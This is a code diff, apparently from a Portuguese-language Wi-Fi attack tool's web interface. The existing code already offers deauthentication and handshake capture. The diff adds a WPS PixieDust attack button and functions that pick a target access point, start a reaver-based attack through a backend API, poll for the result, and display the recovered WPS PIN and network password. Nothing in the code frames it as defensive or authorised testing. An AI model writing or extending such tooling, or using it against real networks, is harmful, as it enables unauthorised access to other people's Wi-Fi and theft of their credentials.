@@ -219,6 +219,7 @@ function openNet(net, saved) {
       <button class="btn" id="btnCapA" style="margin-top:8px">💥 Capturar + Deauth (ativo)</button>
       <button class="btn sec" id="btnCapP" style="margin-top:8px">🎧 Capturar passivo (só escuta)</button>
       <button class="btn danger" id="btnDeauth" style="margin-top:8px">📡 Só Deauth (derrubar)</button>
+      <button class="btn" id="btnWps" style="margin-top:8px">🔑 Atacar WPS (PixieDust)</button>
       <div class="muted" style="margin-top:8px">O modo <b>ativo</b> derruba e captura no mesmo processo. ${wpa3 ? '<b style="color:#ffb454">WPA3 bloqueia deauth (PMF)</b> — mire um AP WPA2 do mesh.' : ""}</div>
     </div>`;
   const apNote = () => {
@@ -233,7 +234,49 @@ function openNet(net, saved) {
   $("#btnCapA").onclick = () => startCapture(net, "ativo");
   $("#btnCapP").onclick = () => startCapture(net, "passivo");
   $("#btnDeauth").onclick = () => deauthNet(net);
+  $("#btnWps").onclick = () => startWps(net);
 }
+async function startWps(net) {
+  const aps = normAps(net);
+  const ap = NET_TARGET ? aps.find((a) => a.bssid === NET_TARGET) : aps.find((a) => a.wps === "aberto") || aps[0];
+  if (!ap) { toast("sem BSSID"); return; }
+  if (ap.wps === "travado") { toast("WPS travado (lock) - pode falhar"); }
+  if (ap.wps === "fechado") { toast("WPS fechado neste AP"); return; }
+  const bssid = ap.bssid, ch = ap.canal;
+  const fx = fxRun("WPS - " + bssid, 9000, ["travando canal " + (ch || "?") + "...", "subindo reaver (PixieDust)...", "alvo: " + bssid, "trocando mensagens WPS...", "tentando PIN offline..."]);
+  const r = await post("/api/wifi/wps/start", { bssid, channel: Number(ch) || null, iface: IFACE, essid: net.essid });
+  if (!r.ok) { fx.fail(r.error || "falha"); return; }
+  fx.done("ataque WPS rodando");
+  viewWps(net, bssid);
+  pollWps(net, bssid);
+}
+
+function viewWps(net, bssid) {
+  $("#analyzeOut").innerHTML = '<div class="card" style="margin-top:8px"><h3>WPS - ' + esc(bssid) + '</h3><div class="kv"><span class="k">Estado</span><span class="v" id="wpsState">rodando...</span></div><div class="kv"><span class="k">PIN</span><span class="v" id="wpsPin">-</span></div><div class="kv"><span class="k">PSK</span><span class="v" id="wpsPsk">-</span></div><pre id="wpsLog" class="muted" style="max-height:180px;overflow:auto;font-size:11px;margin-top:8px"></pre><button class="btn danger" id="btnWpsStop" style="margin-top:8px">Parar WPS</button></div>';
+  $("#btnWpsStop").onclick = () => stopWps(net);
+}
+
+async function pollWps(net, bssid) {
+  const r = await get("/api/wifi/wps/status");
+  if (!r.ok) return;
+  const st = $("#wpsState");
+  if (!st) return;
+  if (r.pin) $("#wpsPin").textContent = r.pin;
+  if (r.psk) $("#wpsPsk").textContent = r.psk;
+  if (r.log) $("#wpsLog").textContent = r.log;
+  if (r.sucesso) { st.textContent = "SUCESSO"; toast("WPS quebrado! PIN=" + (r.pin || "?") + " PSK=" + (r.psk || "?")); return; }
+  if (!r.rodando) { st.textContent = "parado"; return; }
+  st.textContent = "rodando...";
+  setTimeout(() => pollWps(net, bssid), 3000);
+}
+
+async function stopWps(net) {
+  const r = await post("/api/wifi/wps/stop", {});
+  toast(r.msg || "parado");
+  const st = $("#wpsState");
+  if (st) st.textContent = "parado";
+}
+
 function targetBssids(net) {
   const aps = normAps(net);
   return NET_TARGET ? [NET_TARGET] : aps.map((a) => a.bssid);
